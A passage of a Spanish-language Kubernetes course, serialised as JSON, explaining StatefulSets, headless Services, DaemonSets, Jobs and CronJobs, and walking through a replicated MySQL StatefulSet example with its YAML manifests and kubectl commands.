/var/lib/mysql.\nEvidentemente, no es necesario modificar la definici√≥n de los otros recursos: Services e Ingress.\nCreamos el Deployment, los Services y el Ingress:\n\nmariadb-srv.yaml\nwordpress-srv.yaml\nwordpress-ingress.yaml\n\nkubectl apply -f mariadb-deployment.yaml\nkubectl apply -f mariadb-srv.yaml\nkubectl apply -f wordpress-deployment.yaml\nkubectl apply -f wordpress-srv.yaml\nkubectl apply -f wordpress-ingress.yaml\n\nAcedemos a la aplicaci√≥n y la configuramos:\n \nImagen de elaboraci√≥n propia (CC BY-NC-SA)\nImagen de elaboraci√≥n propia (CC BY-NC-SA)\nComprobando la persistencia de la informaci√≥n\nSi en cualquier momento tenemos que eliminar o actualizar uno de los despliegues, podemos comprobar que la informaci√≥n sigue existiendo despu√©s de volver a crear los Deployments:\nkubectl delete -f mariadb-deployment.yaml\nkubectl delete -f wordpress-deployment.yaml\nkubectl apply -f mariadb-deployment.yaml\nkubectl apply -f wordpress-deployment.yaml\n\nSi volvemos acceder, comprobamos que la aplicaci√≥n sigue funcionando con toda la informaci√≥n:\nImagen de elaboraci√≥n propia (CC BY-NC-SA)"},"Despliegue-de-aplicaciones-web/kubernetes/9.-otras-cargas-de-trabajo/9.0-otras-cargas-de-trabajo":{"title":"9.0-otras-cargas-de-trabajo","links":[],"tags":[],"content":"9. Otras cargas de trabajo\n¬øPodemos usar un despliegue para todo?\nHasta ahora hemos visto con bastante detalle el uso de los despliegues (Deployments) en Kubernetes. Los despliegues son una herramienta enormemente potente ya que nos permiten adecuar el n√∫mero de pods a la demanda y garantizan el funcionamiento continuo, tanto en el caso de que haya alg√∫n nodo con problemas, como en el caso de actualizaciones que se pueden realizar de forma continua. Sin embargo, no es posible utilizar despliegues en todos los casos, hay determinadas situaciones en las que hay cargas de trabajo (workloads) que no se ajustan adecuadamente a un despliegue de Kubernetes, por lo que se han desarrollado otros objetos para esas situaciones diferentes.\nS√≠ es conveniente remarcar, que siempre que sea posible es mejor definir una carga de trabajo como un despliegue en Kubernetes y limitar el uso de las otras cargas de trabajo que vamos a ver a continuaci√≥n para casos espec√≠ficos. Luego la respuesta a la pregunta con la que empezamos este m√≥dulo es no, no podemos usar un despliegue para todo, pero s√≠ debemos usarlo prioritariamente siempre que sea posible.\nAplicaciones con estado o sin estado\nUna caracter√≠stica de una aplicaci√≥n que es muy importante para Kubernetes es si se trata de una aplicaci√≥n con estado (stateful) o sin estado (stateless). Una aplicaci√≥n sin estado es aquella en la que las peticiones son totalmente independientes unas de otras y no necesita ninguna referencia de una petici√≥n anterior. Un ejemplo de una aplicaci√≥n sin estado ser√≠a un servicio DNS, en el que cada vez que se realiza una petici√≥n es totalmente independiente de las anteriores o posteriores que se hagan. Las aplicaciones sin estado son perfectas para desplegarse el Kubernetes, ya que se ajustan perfectamente a un Deployment y se pueden escalar y balancear sin problemas, ya que cada pod responder√° a las peticiones que reciba de forma independiente al resto.\nPor contra, las aplicaciones con estado son aquellas en las que una petici√≥n puede verse afectada por el resultado de las anteriores y a su vez puede afectar a las posteriores (por eso se dice que tiene estado). Una base de datos ser√≠a el paradigma de una aplicaci√≥n con estado, puesto que cada modificaci√≥n que hagamos a la base de datos puede afectar a las consultas posteriores. Una aplicaci√≥n con estado no se ajusta bien a un Deployment de Kubernetes, ya que de forma general, un cluster de pods independientes no puede tener en cuenta el estado de la aplicaci√≥n correctamente.\nEsto enlaza con el modelo de desarrollo de las aplicaciones, ya que si pensamos en la mayor√≠a de las aplicaciones que utilizamos hoy en d√≠a, se trata de aplicaciones con estado, lo que inicialmente podr√≠a limitar su uso en Kubernetes. Sin embargo, si descomponemos estas aplicaciones en muchos y peque√±os servicios que se intercomuniquen entre s√≠, bastantes de ellos se podr√°n gestionar como aplicaciones sin estado, mientras que otros tendr√°n que ser aplicaciones con estado. √âste es uno de los enfoques m√°s utilizados hoy en d√≠a para desplegar aplicaciones en Kubernetes, hacer que la aplicaci√≥n se ajuste al modelo de microservicios, para utilizar Deployments en todos los microservicios sin estado que se pueda y utilizar otras cargas de trabajo para el resto de componentes. En esta unidad veremos una peque√±a introducci√≥n a estas otras cargas de trabajo."},"Despliegue-de-aplicaciones-web/kubernetes/9.-otras-cargas-de-trabajo/9.1-statefulsets":{"title":"9.1-statefulsets","links":[],"tags":[],"content":"9.1 StatefulSets\nEl objeto StatefulSet controla el despliegue de Pods con identidades √∫nicas y persistentes, y nombres de host estables. El uso de StatefulSets es alternativo al de despliegues (Deployments) y su objetivo principal es poder utilizar en Kubernetes aplicaciones m√°s restrictivas que no se ajusten bien a las caracter√≠sticas de los despliegues, principalmente aplicaciones con estado que necesiten algunas caracter√≠sticas fijas y estables en los Pods, algo que no puede ocurrir con los despliegues en los pods que son completamente indistinguibles unos de otros y la aplicaci√≥n puede utilizar cualquiera de ellos en cada momento.\nVeamos algunos ejemplos en los es adecuado utilizar StatefulSet en lugar de Deployment y por qu√©:\n\nUn despliegue de redis primario-secundario: necesita que el primario est√© operativo antes de que podamos configurar las r√©plicas.\nUn cluster mongodb: Los diferentes nodos deben tener una identidad de red persistente (ya que el DNS es est√°tico), para que se produzca la sincronizaci√≥n despu√©s de reinicios o fallos.\nZookeeper: cada nodo necesita almacenamiento √∫nico y estable, ya que el identificador de cada nodo se guarda en un fichero.\n\nPor lo tanto el objeto StatefulSet nos ofrece las siguientes caracter√≠sticas:\n\nEstable y √∫nico identificador de red (Ejemplo mongodb)\nAlmacenamiento estable (Ejemplo Zookeeper)\nDespliegues y escalado ordenado (Ejemplo redis)\nEliminaci√≥n y actualizaciones ordenadas\n\nPor lo tanto cada Pod es distinto (tiene una identidad √∫nica), y este hecho tiene algunas consecuencias:\n\nEl nombre de cada Pod tendr√° un n√∫mero (1,2,‚Ä¶) que lo identifica y que nos proporciona la posibilidad de que la creaci√≥n actualizaci√≥n y eliminaci√≥n sea ordenada. Se crear√°n en orden ascendente y se eliminar√°n en orden descendente.\nSi un nuevo Pod es recreado, obtendr√° el mismo nombre (hostname), los mismos nombres DNS (aunque la IP pueda cambiar) y el mismo volumen que ten√≠a asociado.\nNecesitamos crear un Service especial, llamado Headless Service, que nos permite acceder a los Pods de forma independiente, pero que no balancea la carga entre ellos, por lo tanto este Service no tendr√° una ClusterIP.\n\nStatefulSet vs Deployment\n\nA diferencia de un Deployment, un StatefulSet mantiene una identidad fija para cada uno de sus Pods.\nEliminar y/o escalar un StatefulSet no eliminar√° los vol√∫menes asociados con StatefulSet.\nStatefulSets actualmente requiere que un Headless Service sea responsable de la identidad de red de los Pods.\nAl utilizar StatefulSet, cada Pod recibe un PersistentVolume independiente.\nStatefulSet actualmente no admite el escalado autom√°tico.\n\nCreando el Headless Service para acceder a los Pods del StatefulSet\nUna de las caracter√≠sticas de los Pods controlados por un StatefulSet es que son √∫nicos (todos los Pods son distintos), por lo tanto al acceder a ellos por medio de la definici√≥n de un Service no necesitamos el balanceo de carga entre ellos.\nPara acceder a los Pods de un StatefulSet vamos a crear un Service Headless que se caracteriza por no tener IP (ClusterIP) y por lo tanto no va a balancear la carga entre los distintos Pods. Este tipo de Service va a crear una entrada DNS por cada Pod, que nos permitir√° acceder a cada Pod de forma independiente. El nombre DNS que se crear√° ser√° &lt;nombre del Pod&gt;.&lt;dominio del StatefulSet&gt;. El dominio del StatefulSet se indicar√° en la definici√≥n del recurso usando el par√°metro serviceName.\nVeamos un ejemplo de definici√≥n de un Headless Service (fichero service.yaml):\napiVersion: v1\nkind: Service\nmetadata:\n  name: nginx\n  labels:\n    app: nginx\nspec:\n  ports:\n  - port: 80\n    name: web\n  clusterIP: None\n  selector:\n    app: nginx\n\nEn esta definici√≥n podemos observar que al indicar clusterIP: None estamos creando un Headless Service, que no tendr√° ClusterIP (por lo que no balancear√° la carga entre los pods). Este Service ser√° el responsable de crear, por cada Pod seleccionado con el selector, una entrada DNS.\nCreando el recurso StatefulSet\nVamos a definir nuestro recurso StatefulSet en un fichero yaml statefulset.yaml:\napiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: web\nspec:\n  serviceName: &quot;nginx&quot;\n  replicas: 2\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: k8s.gcr.io/nginx-slim:0.8\n        ports:\n        - containerPort: 80\n          name: web\n        volumeMounts:\n        - name: www\n          mountPath: /usr/share/nginx/html\n  volumeClaimTemplates:\n  - metadata:\n      name: www\n    spec:\n      accessModes: [ &quot;ReadWriteOnce&quot; ]\n      resources:\n        requests:\n          storage: 1Gi\n\nVamos a estudiar las caracter√≠sticas de la definici√≥n de este recurso:\n\nCon el par√°metro serviceName indicaremos el nombre de dominio que va a formar parte del nombre DNS que el Headless Service va a crear para cada Pod.\nCon el par√°metro selector se indica los Pods que vamos a controlar con StatefulSet.\nUna de las caracter√≠sticas que hemos indicado del StatefulSet es que cada Pod va a tener un almacenamiento estable. El tipo de almacenamiento se indica con el par√°metro volumeClaimTemplates que se define de forma similar a un PersistentVolumenClaim.\nAdem√°s observamos en la definici√≥n del contenedor que el almacenamiento que hemos definido se va a montar en cada Pod (en este ejemplo el punto de montaje es el DocumentRoot de nginx), con el par√°metro volumeMounts.\n\nEjemplo: Creaci√≥n de un StatefulSet\nVamos a crear los recursos estudiados en este apartado: el Service Headless y el StatefulSet, y vamos a comprobar sus caracter√≠sticas.\nLo primero es crear el Headless Service:\nkubectl apply -f service.yaml\n\nCreaci√≥n ordenada de Pods\nEl statefulSet que hemos definido va a crear dos Pods (replicas: 2). Para observar c√≥mo se crean de forma ordenada podemos usar dos terminales, en la primera ejecutamos:\nwatch kubectl get pod\n\nCon esta instrucci√≥n vamos a ver en ‚Äúvivo‚Äù c√≥mo se van creando los Pods, que vamos a crear al ejecutar en otra terminal la instrucci√≥n:\nkubectl apply -f statefulset.yaml\n\nComprobamos la identidad de red estable\nEn este caso vamos a comprobar que los hostname y los nombres DNS son estables para cada Pod. Las ips de los Pods pueden cambiar si eliminamos el recurso StatefulSet y lo volvemos a crear, pero los nombres van a permanecer.\nPara ver los nombres de los Pods podemos ejecutar lo siguiente:\nfor i in 0 1; do kubectl exec web-$i -- sh -c &#039;hostname&#039;; done\nweb-0\nweb-1\n\nVeamos los nombres DNS. En este ejemplo el Headless Service ha creado una entrada en el DNS para cada Pod. El nombre DNS que se crear√° ser√° &lt;nombre del pod&gt;.&lt;dominio del StatefulSet&gt;. El dominio del StatefulSet se indicar√° en la definici√≥n del recurso usando el par√°metro serviceName. En este caso el nombre del primer Pod ser√° web-0.nginx. Vamos a comprobarlo, haciendo una consulta DNS desde otro pod:\nkubectl run -i --tty --image busybox:1.28 dns-test --restart=Never --rm\n/ # nslookup web-0.nginx\n...\nAddress 1: 172.17.0.4 web-0.nginx.default.svc.cluster.local\n/ # nslookup web-1.nginx\n...\nAddress 1: 172.17.0.5 web-1.nginx.default.svc.cluster.local\n\nEliminaci√≥n de pods\nPodemos usar las dos terminales para observar c√≥mo la eliminaci√≥n tambi√©n se hace de forma ordenada. En la primera terminal ejecutamos:\nwatch kubectl get pod\n\nY en la segunda:\nkubectl delete pod -l app=nginx\n\nAl eliminar los Pods, el statefulSet ha creado nuevos Pods que ser√°n id√©nticos a los anteriores y por lo tanto mantendr√°n la identidad de red, es decir tendr√°n los mismos hostname y los mismos nombres DNS (aunque es posible que cambien las ip):\nfor i in 0 1; do kubectl exec web-$i -- sh -c &#039;hostname&#039;; done\nweb-0\nweb-1\n\nkubectl run -i --tty --image busybox:1.28 dns-test --restart=Never --rm\n/ # nslookup web-0.nginx\n...\n/ # nslookup web-1.nginx\n...\n\nEscribiendo en los vol√∫menes persistente\nPodemos comprobar que se han creado los distintos vol√∫menes para cada pod:\nkubectl get pv,pvc\n\nY podemos comprobar que realmente la informaci√≥n que guardemos en el directorio que hemos montado en cada Pod es persistente:\nfor i in 0 1; do kubectl exec &quot;web-$i&quot; -- sh -c &#039;echo &quot;$(hostname)&quot; &gt; /usr/share/nginx/html/index.html&#039;; done\nfor i in 0 1; do kubectl exec -i -t &quot;web-$i&quot; -- sh -c &#039;curl http://localhost/&#039;; done\nweb-0\nweb-1\n\nAhora si eliminamos los Pods, los nuevos Pods creados mantendr√°n la informaci√≥n:\nkubectl delete pod -l app=nginx\nfor i in 0 1; do kubectl exec -i -t &quot;web-$i&quot; -- sh -c &#039;curl http://localhost/&#039;; done\nweb-0\nweb-1\n"},"Despliegue-de-aplicaciones-web/kubernetes/9.-otras-cargas-de-trabajo/9.2-daemonsets":{"title":"9.2-daemonsets","links":[],"tags":[],"content":"9.2 DaemonSets\nEl objeto DaemonSet (DS) se utiliza cuando queremos ejecutar un pod en todos los nodos del cluster o al menos en un conjunto de ellos que tienen una serie de caracter√≠sticas en com√∫n. Un DaemonSet se utiliza en algunas circunstancias muy concretas, por ejemplo:\n\nEjecutar un pod en cada nodo para la monitorizaci√≥n del cluster: Prometheus, Sysdig, collectd, datadog, etc.\nEjecutar un pod en cada nodo para la recolecci√≥n y gesti√≥n de logs: fluentd, logstash\nEjecutar un pod en cada nodo para el almacenamiento del cluster: ceph o glusterfs\n\nUn ejemplo de DaemonSet tendr√≠a el siguiente aspecto:\napiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: daemonset1\nspec:\n  selector:\n      matchLabels:\n        name: daemonset-pod \n  template:               # Plantilla con las caracter√≠sticas del Pod\n    metadata:\n      labels:\n        name: daemonset-pod \n    spec:\n      nodeSelector:\n        type: worker-prod # Etiqueta del nodo en el que se ejecuta (opcional)\n      containers:\n      - name: daemon-pod\n        image: ...\n\nLos par√°metros tienen los valores habituales anteriormente descritos y en este caso, se incluye una plantilla con la descripci√≥n del pod que se ejecutar√° en cada nodo (en este caso en cada nodo con etiqueta worker-prod)."},"Despliegue-de-aplicaciones-web/kubernetes/9.-otras-cargas-de-trabajo/9.3-jobs-y-cronjobs":{"title":"9.3-jobs-y-cronjobs","links":[],"tags":[],"content":"9.3 Jobs y Cronjobs\nJob\nEl objeto Job se utiliza cuando queremos ejecutar una tarea puntual, para lo que se define el objeto y se crean todos los objetos necesarios para realizarla, principalmente creando uno o varios Pods hasta que se finaliza la tarea. Una vez se termina la tarea y de forma general, los pods permanecer√°n creados y no se borrar√°n hasta que se elimine el Job que los cre√≥.\nUn ejemplo de Job tendr√≠a el siguiente aspecto:\napiVersion: batch/v1\nkind: Job\nmetadata:\n  name: pi\nspec:\n  template:\n    spec:\n      containers:\n      - name: pi\n        image: perl\n        command: [&quot;perl&quot;,  &quot;-Mbignum=bpi&quot;, &quot;-wle&quot;, &quot;print bpi(2000)&quot;]\n      restartPolicy: Never\n  backoffLimit: 4\n\nEn el ejemplo anterior se lanza un contenedor de la imagen perl y realiza el c√°lculo de Pi con una precisi√≥n de 2000 decimales utilizando este lenguaje.\nUna vez lanzada la tarea, podremos ver que se crea tanto un objeto Job como un Pod, el primero aparece sin finalizar y el Pod aparece ejecut√°ndose:\nNAME           READY   STATUS    RESTARTS   AGE\npod/pi-jbt4r   1/1     Running   0          4s\n\n...\n\nNAME           COMPLETIONS   DURATION   AGE\njob.batch/pi   0/1           4s         4s\n\nSin embargo, una vez que la tarea del contenedor finaliza, en este caso cuando se consigue el n√∫mero Pi con dos mil decimales de precisi√≥n, el Pod se para y la tarea se marca como completada:\nNAME           READY   STATUS      RESTARTS   AGE\npod/pi-jbt4r   0/1     Completed   0          10s\n\n....\n\nNAME           COMPLETIONS   DURATION   AGE\njob.batch/pi   1/1           9s         10s\n\nPodemos ver que no se borra el Pod, ya que lo necesitamos en muchas ocasiones para ver el resultado de la tarea. En este caso para ver el n√∫mero Pi con la precisi√≥n solicitada, ver√≠amos los logs del pod:\nkubectl logs pi-jbt4r\n3.1415926535897932384626433832795028841971693993751058209749445923078164062862089986280348253421170679821480865132823066470938446095505822317253594081284811174502841027019385211055596446229489549303819644288109756659334461284756482337867831652712019091456485669234603486104543266482133936072602491412737245870066063155881748815209209628292540917153643678925903600113305305488204665213841469519415116094330572703657595919530921861173819326117931051185480744623799627495673518857527248912279381830119491298336733624406566430860213949463952247371907021798609437027705392171762931767523846748184676694051320005681271452635608277857713427577896091736371787214684409012249534301465495853710507922796892589235420199561121290219608640344181598136297747713099605187072113499999983729780499510597317328160963185950244594553469083026425223082533446850352619311881710100031378387528865875332083814206171776691473035982534904287554687311595628638823537875937519577818577805321712268066130019278766111959092164201989380952572010654858632788659361533818279682303019520353018529689957736225994138912497217752834791315155748572424541506959508295331168617278558890750983817546374649393192550604009277016711390098488240128583616035637076601047101819429555961989467678374494482553797747268471040475346462080466842590694912933136770289891521047521620569660240580381501935112533824300355876402474964732639141992726042699227967823547816360093417216412199245863150302861829745557067498385054945885869269956909272107975093029553211653449872027559602364806654991198818347977535663698074265425278625518184175746728909777727938000816470600161452491921732172147723501414419735685481613611573525521334757418494684385233239073941433345477624168625189835694855620992192221842725502542568876717904946016534668049886272327917860857843838279679766814541009538837863609506800642251252051173929848960841284886269456042419652850222106611863067442786220391949450471237137869609563643719172874677646575739624138908658326459958133904780275901\n\nPara seguir aprendiendo\nOcultar\n\nPara m√°s informaci√≥n acerca de los Jobs puedes leer la documentaci√≥n de la API.\n\nOcultar\nCronJob\nEn el caso de que la tarea que tengamos que realizar no sea puntual, sino que se tenga que repetir cada cierto tiempo conforme a un patr√≥n, k8s ofrece el objeto CronJob, que crear√° tareas conforme a la periodicidad que se indique.\nEn el siguiente ejemplo de CronJob, ejecutamos una tarea cada minuto, en la que se muestra la fecha y hora junto al texto ‚ÄúCurso del CEP‚Äù:\napiVersion: batch/v1\nkind: CronJob\nmetadata:\n  name: hello\nspec:\n  schedule: &quot;*/1 * * * *&quot;\n  jobTemplate:\n    spec:\n      template:\n        spec:\n          containers:\n          - name: hello\n            image: busybox\n            imagePullPolicy: IfNotPresent\n            command:\n            - /bin/sh\n            - -c\n            - date; echo Curso del CEP\n          restartPolicy: OnFailure\n\nPara la definici√≥n del objeto CronJob debe especificarse un nombre y el patr√≥n de repetici√≥n conforme al cron de UNIX, adem√°s de incluir en jobTemplate la definici√≥n del objeto Job que se desea ejecutar."},"Despliegue-de-aplicaciones-web/kubernetes/9.-otras-cargas-de-trabajo/ejemplo-despliegue-de-un-cluster-con-mysql":{"title":"ejemplo-despliegue-de-un-cluster-con-mysql","links":[],"tags":[],"content":"Ejemplo: despliegue de un cluster con MySQL\nOcultar\nUna base de datos relacional es un ejemplo perfecto de aplicaci√≥n con estado, cualquier petici√≥n puede depender del estado resultante de una petici√≥n anterior, y todas las peticiones deben consultar o modificar la base de datos que incluya la √∫ltima modificaci√≥n realizada. Las implicaciones que tiene esto si queremos desplegar la base de datos sobre Kubernetes son importantes, ya que ser√° necesario que la base de datos se pueda desplegar en un cluster para proporcionar disponibilidad, se pueda adaptar a variaciones de demanda y no haya interrupciones, mientras que hay que garantizar que todos los pods accedan a la base de datos de forma coherente.\n\n¬øPodemos utilizar un Deployment con r√©plicas indistinguibles que se crean o destruyen a demanda?\n¬øNecesitamos un volumen adicional para almacenar localmente la base de datos en cada pod?\n¬øC√≥mo garantizamos la replicaci√≥n de la base de datos entre los nodos?\n\nHay diferentes formas de afrontar esto y dependen mucho de las caracter√≠sticas de la base de datos en cuesti√≥n. En este ejemplo vamos a desplegar un cluster de MySQL con un nodo primario (tambi√©n denominado master) en modo lectura y escritura (se podr√°n hacer consultas y modificaciones de la base de datos) y varios nodos secundarios en modo lectura (s√≥lo se utilizar√°n para realizar consultas). Utilizaremos para ello un StatefulSet, en el que los diferentes pods son distinguibles entre s√≠, tienen siempre el mismo nombre DNS interno y el mismo volumen se conecta siempre al mismo pod. El primer nodo que se desplegar√° ser√° el primario, con un volumen asociado para la base de datos, el resto de nodos se arrancar√°n despu√©s del primario y al iniciarse sincronizar√°n la base de datos con la del primario y la almacenar√°n tambi√©n en un volumen diferente para cada Pod.\nEste ejemplo es probablemente el m√°s avanzado de todo el curso y utilizaremos adem√°s otros recursos como ConfigMap, Services o vol√∫menes. Este ejemplo est√° extra√≠do directamente de la documentaci√≥n de k8s: Run a Replicated Stateful Application.\nNota\nOcultar\nNota Las caracter√≠sticas de este cluster no son para poner en producci√≥n, ya que se ha simplificado la configuraci√≥n de MySQL, para centrarnos en los aspectos relacionados con Kubernetes.\nNota\nOcultar\nNota En caso de no tener recursos suficientes para realizar este ejemplo, se puede reducir el n√∫mero de r√©plicas a dos, o bien eliminar el cluster y volverlo a crear con suficientes recursos (en el ejemplo siguiente creamos un nuevo cluster de k8s con 6 GiB de RAM y 4 cores virtuales:\nminikube stop\nminikube delete\nminikube start --driver ... --memory 6144 --cpus 4\n\nOcultar\nVamos pues con la creaci√≥n de este cluster, para lo que utilizaremos diferentes objetos de Kubernetes que hemos visto durante todo el curso.\nCreamos un ConfigMap para modificar el fichero de configuraci√≥n de MySQL, de manera que el primario genere los registros para la sincronizaci√≥n y los secundarios act√∫en en modo lectura: configmap.yaml\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: mysql\n  labels:\n    app: mysql\ndata:\n  primary.cnf: |\n    # Modificaci√≥n del primario\n    [mysqld]\n    log-bin\n  replica.cnf: |\n    # Modificaci√≥n de los secundarios\n    [mysqld]\n    super-read-only\n\nkubectl apply -f configmap.yaml\n\nCreamos dos servicios, uno de tipo Headless asociado con el StatefulSet para gestionar los nombres internos de los pods y otro para balancear entre los diferentes pods secundarios las peticiones de lectura: servicios.yaml\n# Servicio para usar los nombres DNS internamente\napiVersion: v1\nkind: Service\nmetadata:\n  name: mysql\n  labels:\n    app: mysql\nspec:\n  ports:\n  - name: mysql\n    port: 3306\n  clusterIP: None\n  selector:\n    app: mysql\n---\n# Servicio para balancear los clientes entre los nodos secundarios\n# en modo lectura\napiVersion: v1\nkind: Service\nmetadata:\n  name: mysql-read\n  labels:\n    app: mysql\nspec:\n  ports:\n  - name: mysql\n    port: 3306\n  selector:\n    app: mysql\n\nkubectl apply -f servicios.yaml\n\nY ya por √∫ltimo creamos el StatefulSet, que en este caso es el objeto m√°s complicado que vamos a ver en este curso. Veamos los elementos que utiliza:\n\nEst√° formado inicialmente por tres pods, de los que en el primero se ejecutar√° el servidor MySQL primario y en los otros dos los servidores MySQL secundarios.\nSe define un volumen de 10 GiB para cada pod a trav√©s de un volumeClaim.\nUtiliza dos contenedores en cada pod, el principal que se encarga de ejecutar el proceso mysql y uno adicional que se encarga de la sincronizaci√≥n de la base de datos mediante XtraBackup. Ambos contenedores deben poder acceder al mismo volumen en el que se encuentra la base de datos, en el punto de montaje /var/lib/mysql.\nUtiliza InitContainers que no hemos visto en el curso; estos contenedores se ejecutan dentro del pod antes del contenedor normal y se utilizan para realizar configuraciones o modificaciones previas a la utilizaci√≥n del contenedor que va a ejecutar la aplicaci√≥n. Una vez que el InitContainer ha finalizado se lanza el contenedor normal. En este caso se utilizan para la configuraci√≥n inicial del contenedor mysql mediante un script que se lanza como un comando (si el √≠ndice es 0 configura el contenedor como primario y si es otro n√∫mero, lo hace como secundario). El otro InitContainer se utiliza para clonar inicialmente la base de datos en los secundarios con xtrabackup.\nSe establece l√≠mite de consumo de recursos y se definen las pruebas de disponibilidad para que Kubernetes pueda comprobar si se est√° ofreciendo el servicio de forma adecuada.\nSe define el acceso a la base de datos sin contrase√±a, lo que hace que el sistema no sea v√°lido para un despliegue real.\n\nstatefulset.yaml\napiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: mysql\nspec:\n  selector:\n    matchLabels:\n      app: mysql\n  serviceName: mysql\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: mysql\n    spec:\n      initContainers:\n      - name: init-mysql\n        image: mysql:5.7\n        command:\n        - bash\n        - &quot;-c&quot;\n        - |\n          set -ex\n          # Numera los servidores en funci√≥n del √≠ndice del pod\n          [[ `hostname` =~ -([0-9]+)$ ]] || exit 1\n          ordinal=${BASH_REMATCH[1]}\n          echo [mysqld] &gt; /mnt/conf.d/server-id.cnf\n          # Establece el n√∫mero del servidor a partir de 100\n          echo server-id=$((100 + $ordinal)) &gt;&gt; /mnt/conf.d/server-id.cnf\n          # Modifica MySQL con el ConfigMap en funci√≥n de si es el primario (0) o no\n          if [[ $ordinal -eq 0 ]]; then\n            cp /mnt/config-map/primary.cnf /mnt/conf.d/\n          else\n            cp /mnt/config-map/replica.cnf /mnt/conf.d/\n          fi\n        volumeMounts:\n        - name: conf\n          mountPath: /mnt/conf.d\n        - name: config-map\n          mountPath: /mnt/config-map\n      - name: clone-mysql\n        image: gcr.io/google-samples/xtrabackup:1.0\n        command:\n        - bash\n        - &quot;-c&quot;\n        - |\n          set -ex\n          # No clona si ya existen datos.\n          [[ -d /var/lib/mysql/mysql ]] &amp;&amp; exit 0\n          # No clona si se trata del primario.\n          [[ `hostname` =~ -([0-9]+)$ ]] || exit 1\n          ordinal=${BASH_REMATCH[1]}\n          [[ $ordinal -eq 0 ]] &amp;&amp; exit 0\n          # Clona los datos del pod inmediatamente anterior\n          ncat --recv-only mysql-$(($ordinal-1)).mysql 3307 | xbstream -x -C /var/lib/mysql\n          # Prepara la copia de seguridad\n          xtrabackup --prepare --target-dir=/var/lib/mysql\n        volumeMounts:\n        - name: data\n          mountPath: /var/lib/mysql\n          subPath: mysql\n        - name: conf\n          mountPath: /etc/mysql/conf.d\n      containers:\n      - name: mysql\n        image: mysql:5.7\n        env:\n        - name: MYSQL_ALLOW_EMPTY_PASSWORD\n          value: &quot;1&quot;\n        ports:\n        - name: mysql\n          containerPort: 3306\n        volumeMounts:\n        - name: data\n          mountPath: /var/lib/mysql\n          subPath: mysql\n        - name: conf\n          mountPath: /etc/mysql/conf.d\n        resources:\n          requests:\n            cpu: 200m\n            memory: 1Gi\n        livenessProbe:\n          exec:\n            command: [&quot;mysqladmin&quot;, &quot;ping&quot;]\n          initialDelaySeconds: 30\n          periodSeconds: 10\n          timeoutSeconds: 5\n        readinessProbe:\n          exec:\n            # Comprueba si se pueden hacer consultas sobre TCP\n            command: [&quot;mysql&quot;, &quot;-h&quot;, &quot;127.0.0.1&quot;, &quot;-e&quot;, &quot;SELECT 1&quot;]\n          initialDelaySeconds: 5\n          periodSeconds: 2\n          timeoutSeconds: 1\n      - name: xtrabackup\n        image: gcr.io/google-samples/xtrabackup:1.0\n        ports:\n        - name: xtrabackup\n          containerPort: 3307\n        command:\n        - bash\n        - &quot;-c&quot;\n        - |\n          set -ex\n          cd /var/lib/mysql\n\n          # Determina la posici√≥n de log a clonar.\n          if [[ -f xtrabackup_slave_info &amp;&amp; &quot;x$(&lt;xtrabackup_slave_info)&quot; != &quot;x&quot; ]]; then\n            # Modificaciones previas\n            cat xtrabackup_slave_info | sed -E &#039;s/;$//g&#039; &gt; change_master_to.sql.in\n            rm -f xtrabackup_slave_info xtrabackup_binlog_info\n          elif [[ -f xtrabackup_binlog_info ]]; then\n            # Si existe xtrabackup_binlog_info, estamos clonando desde el primario\n            [[ `cat xtrabackup_binlog_info` =~ ^(.*?)[[:space:]]+(.*?)$ ]] || exit 1\n            rm -f xtrabackup_binlog_info xtrabackup_slave_info\n            echo &quot;CHANGE MASTER TO MASTER_LOG_FILE=&#039;${BASH_REMATCH[1]}&#039;,\\\n                  MASTER_LOG_POS=${BASH_REMATCH[2]}&quot; &gt; change_master_to.sql.in\n          fi\n\n          # Se comprueba si es necesaria completar un clon iniciando la replicaci√≥n.\n          if [[ -f change_master_to.sql.in ]]; then\n            echo &quot;Esperando a que mysqld est√© disponible&quot;\n            until mysql -h 127.0.0.1 -e &quot;SELECT 1&quot;; do sleep 1; done\n\n            echo &quot;Inicializando la r√©plica desde la √∫ltima modificaci√≥n&quot;\n            mysql -h 127.0.0.1 \\\n                  -e &quot;$(&lt;change_master_to.sql.in), \\\n                          MASTER_HOST=&#039;mysql-0.mysql&#039;, \\\n                          MASTER_USER=&#039;root&#039;, \\\n                          MASTER_PASSWORD=&#039;&#039;, \\\n                          MASTER_CONNECT_RETRY=10; \\\n                        START SLAVE;&quot; || exit 1\n            # En caso de que el contenedor se reinicie, se intenta de nuevo.\n            mv change_master_to.sql.in change_master_to.sql.orig\n          fi\n\n          # Lanza un servidor que pueda mandar copias solicitadas por otros.\n          exec ncat --listen --keep-open --send-only --max-conns=1 3307 -c \\\n            &quot;xtrabackup --backup --slave-info --stream=xbstream --host=127.0.0.1 --user=root&quot;\n        volumeMounts:\n        - name: data\n          mountPath: /var/lib/mysql\n          subPath: mysql\n        - name: conf\n          mountPath: /etc/mysql/conf.d\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n      volumes:\n      - name: conf\n        emptyDir: {}\n      - name: config-map\n        configMap:\n          name: mysql\n  volumeClaimTemplates:\n  - metadata:\n      name: data\n    spec:\n      accessModes: [&quot;ReadWriteOnce&quot;]\n      resources:\n        requests:\n          storage: 10Gi\n\nkubectl apply -f statefulset.yaml\n\nPodemos ir comprobando con kubectl c√≥mo se van creando los diferentes pods y contenedores, tanto los InitContainers como los contenedores de cada pod y al tratarse de un StatefulSet, los pods no se crean en paralelo, lo hacen de manera secuencial (algo fundamental en este caso, ya que hasta que no ha terminado el primer pod que contiene el contendor primario, no deben lanzarse los secundarios).\nPrueba de funcionamiento de la base de datos\n\nCreamos un pod ef√≠mero con un cliente de MySQL para crear una tabla con un registro en el pod mysql-0 (con nombre DNS mysql-0.mysql):\n\nkubectl run mysql-client --image=mysql:5.7 -i --rm --restart=Never --\\\n  mysql -h mysql-0.mysql &lt;&lt;EOF\nCREATE DATABASE prueba;\nCREATE TABLE prueba.saludos (mensaje VARCHAR(250));\nINSERT INTO prueba.saludos VALUES (&#039;Bienvenidos al curso del CEP de k8s&#039;);\nEOF\n\n\nUna vez realizada la modificaci√≥n en la base de datos, se eliminar√° el pod con el cliente MySQL. 